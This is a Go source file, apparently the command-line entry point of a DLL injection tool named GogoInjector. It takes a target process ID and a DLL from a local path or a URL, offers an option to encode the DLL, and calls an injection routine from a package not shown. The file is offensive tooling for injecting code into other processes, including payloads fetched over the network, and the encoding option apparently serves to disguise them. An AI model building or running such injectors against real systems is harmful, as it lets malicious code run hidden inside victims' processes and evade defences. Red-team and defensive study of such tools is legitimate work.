package main

import (
	"GogoInjector/encode"
	"GogoInjector/inject"
	"flag"
	"fmt"
	"os"
	"unsafe"
)

//var dll_path = "rusty_inject.dll"

func main() {

	// Define the command-line options.
	pidPtr := flag.Int("pid", 0, "Process ID")
	localPtr := flag.String("local", "", "Local file path")
	urlPtr := flag.String("url", "", "URL of the file")
	encodeptr := flag.String("encode", "", "path of the dll to encode")

	// Parse the command-line options.
	flag.Parse()

	// Dereference the pointers
	pid := *pidPtr
	local := *localPtr
	url := *urlPtr
	encode_path := *encodeptr
	dwPID := *(*uint32)(unsafe.Pointer(&pid))

	if encode_path != "" {
		encode.Encode(encode_path)
		os.Exit(1)
	}
	fmt.Printf("dwPID :%v\n", dwPID)
	if pid == 0 && encode_path == "" {
		// Check if PID is provided
		fmt.Println("PID is required.")
		os.Exit(1)
	}

	if local != "" && url != "" {
		// If both local and url are provided
		fmt.Println("Please provide either local file path or url, not both.")
		os.Exit(1)
	}

	if local == "" && url == "" {
		// If neither local nor url are provided
		fmt.Println("Please provide either local file path or url.")
		os.Exit(1)
	}

	if (local != "" || url != "") && pid != 0 && encode_path != "" {
		fmt.Println("Encode is set. Use it to encore the dll before loading it.")
		os.Exit(1)
	}

	fmt.Println("PID:", pid)

	if local != "" {
		// Handle the --local option.
		fmt.Println("Local path:", local)
		loading_type := "disk"

		// Run injection with local path
		err := inject.Mainfunc(dwPID, local, loading_type)
		if err != nil {
			fmt.Println("Error :", err)
			return
		}
	} else if url != "" {
		// Handle the --url option.
		loading_type := "url"

		//Run injection with url
		err := inject.Mainfunc(dwPID, url, loading_type)
		if err != nil {
			fmt.Println("Error :", err)
			return
		}
	}

}
